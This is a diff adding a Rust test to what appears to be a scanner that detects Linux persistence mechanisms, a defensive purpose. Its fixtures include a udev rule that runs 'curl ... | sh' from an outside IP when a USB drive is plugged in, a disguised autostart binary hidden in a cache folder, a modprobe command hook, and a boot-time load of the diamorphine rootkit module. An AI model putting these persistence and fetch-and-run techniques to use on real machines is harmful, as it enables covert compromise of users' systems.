@@ -330,3 +330,28 @@ fn sshd_config() {
         ]
     );
 }
+
+#[test]
+fn udev_autostart_and_kernel_modules() {
+    let udev = read("etc/udev/rules.d/99-usb-sync.rules");
+    assert_eq!(
+        udev.entries[0].summary(),
+        "on ACTION==\"add\", SUBSYSTEM==\"block\", ENV{ID_BUS}==\"usb\": runs /bin/sh -c 'curl -s http://198.51.100.23/s | sh'"
+    );
+    assert_eq!(flagged(&udev), [(2, vec![Flag::DownloadToShell])]);
+    assert_eq!(udev.entries[1].command, None);
+
+    let autostart = read("home/alice/.config/autostart/tracker-extract.desktop");
+    assert_eq!(
+        autostart.entries[0].summary(),
+        "at login as alice: Tracker Extract: /home/alice/.cache/.tracker/tracker-extract --daemon"
+    );
+
+    let modprobe = read("etc/modprobe.d/blacklist-local.conf");
+    assert_eq!(flagged(&modprobe), [(4, vec![Flag::ModprobeCommand])]);
+    let modules = read("etc/modules-load.d/kernel-helpers.conf");
+    assert_eq!(
+        modules.entries[0].summary(),
+        "kernel module loaded at boot: diamorphine"
+    );
+}
